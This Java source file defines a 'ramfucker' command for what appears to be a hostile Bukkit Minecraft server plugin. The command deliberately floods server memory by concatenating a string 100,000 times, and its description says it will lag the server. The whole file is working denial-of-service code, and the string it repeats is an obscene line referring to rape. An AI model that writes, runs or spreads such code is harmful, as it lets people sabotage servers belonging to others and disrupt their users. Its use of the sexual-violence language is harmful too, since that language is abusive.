package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.bukkit.entity.Player;

public class RamFucker implements Command {
    private String str = "";

    @Override
    public String[] getCommands() {
        return new String[]{"ramfucker"};
    }

    @Override
    public String getDescription() {
        return "Fucks up the ram (WILL LAG THE SERVER).";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        sender.sendMessage(Colors.Prefix + Colors.Caution + "Attempting to fuck the ram...");
        for (int i = 0; i < 100000; i++) {
            str += "'THIS SERVER IS GETTING ANALLY RAPED' - HELLIN\n";
        }

        sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully fucked the ram!");
    }
}
